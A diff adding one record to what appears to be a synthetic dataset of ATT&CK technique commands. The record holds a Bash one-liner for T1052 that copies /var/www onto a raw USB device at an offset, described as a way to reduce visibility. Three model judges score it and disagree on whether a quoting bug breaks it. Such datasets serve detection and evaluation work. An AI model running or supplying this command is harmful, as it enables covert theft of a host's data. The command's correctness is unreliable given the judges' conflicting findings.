@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UDEV=$(lsblk -o NAME,TRAN -nr | awk \"$2==\\\"usb\\\"{print \\\"/dev/\\\"$1}\" | head -n1); tar -cf - /var/www | gzip -9 | dd of=\"$UDEV\" bs=1M seek=8 conv=notrunc,fsync status=none'",
+  "explanation": "Writes a gzip-compressed tar of /var/www directly to the USB device starting at an offset (seek=8), embedding data on physical media without mounting a filesystem.",
+  "rationale_steps": [
+    "Find the raw USB device node with lsblk.",
+    "Create a compressed tar archive of local web content.",
+    "Write to the USB at a non-zero offset to reduce visibility.",
+    "Keep all operations local to the host and physical device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-57097ab4",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, proper separators, and valid options for lsblk, tar, gzip, and dd.",
+        "semantic_score": 3,
+        "semantic_justification": "While the approach aligns with exfiltration to a raw USB device at an offset, the awk program is double-quoted so $1/$2 are expanded by the shell, likely leaving UDEV empty and causing dd to fail, undermining the intended operation.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:19:04.049743Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper escaping of the awk condition within the outer single-quoted bash -c string, valid pipe chains, and correct dd flag syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1052 by auto-detecting a USB device via lsblk transport type, compressing /var/www with gzip -9, and writing raw data at a sector offset (seek=8) using dd with notrunc/fsync to embed data on physical media without a filesystem, which is operationally realistic and evades casual filesystem-level inspection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:38:35.433312Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 3,
+        "syntactic_justification": "The command uses double quotes for the AWK script within a bash -c string, which causes the shell to attempt to expand $1 and $2 as shell variables rather than AWK fields, leading to an AWK syntax error.",
+        "semantic_score": 4,
+        "semantic_justification": "The logic is highly appropriate for T1052, correctly identifying USB block devices and using dd with an offset (seek=8) to hide data in unpartitioned space, though the AWK quoting bug hinders immediate execution.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:38:50.772951Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
